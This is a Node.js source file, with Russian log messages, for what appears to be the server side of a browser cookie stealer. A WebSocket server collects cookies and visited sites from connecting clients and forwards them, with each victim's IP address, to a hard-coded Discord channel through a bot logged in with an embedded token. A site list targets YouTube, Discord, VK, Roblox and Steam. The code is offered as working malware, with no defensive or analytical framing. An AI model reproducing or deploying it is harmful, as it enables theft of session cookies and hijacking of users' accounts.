const WebSocket = require("ws");
const Discord = require("discord.js");
const DiscordClient  = new Discord.Client();
const fs = require("fs");

let logs = require("./logs.json");

let filteredSites = ["https://www.youtube.com","https://discordapp.com","https://vk.com","https://www.roblox.com",
    "https://store.steampowered.com"
]

setInterval(()=>{
    console.log("Сохраняю логи...");
    fs.writeFile("logs.json",JSON.parse(logs),(err)=>{});
},300000)

DiscordClient.login("NzAyMTMwMDE4MTAwMzE0MTMy.Xp7j4A.PgriLvFv7f2YcthOYu41zgxAP_4");

let wss = new WebSocket.Server({
    port:228
})

wss.on("connection",client=>{

    console.log("Новый клиент!");
    client.on("message",msg=>{

        let data;
        try{
            data = JSON.parse(msg)
        }catch (e) {
            console.log("Ошибка парса")
        }

        let cookies = data.data.cookie.split(";");
        let listedCookie = "";

        for (let i=0;i<cookies.length;i++){
            listedCookie+="\t"+cookies[i]+"\n";
        }

        let embed = new Discord.MessageEmbed()
            .setTitle(client._socket.remoteAddress+":")
            .setDescription(`Зашел на сайт ${data.site}.\nCookies:\n ${listedCookie}\nЛог не сохранен`)
            .setColor("#ed102e");
        return DiscordClient.guilds.cache.get("702129894884114442").channels.cache.get("702129894884114445").send(embed);
    })
})

function check(url) {
    for(let i=0;i<filteredSites.length;i++){
        if(url.startsWith(filteredSites[i])){
            return true;
        }
    }

    return false
}

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}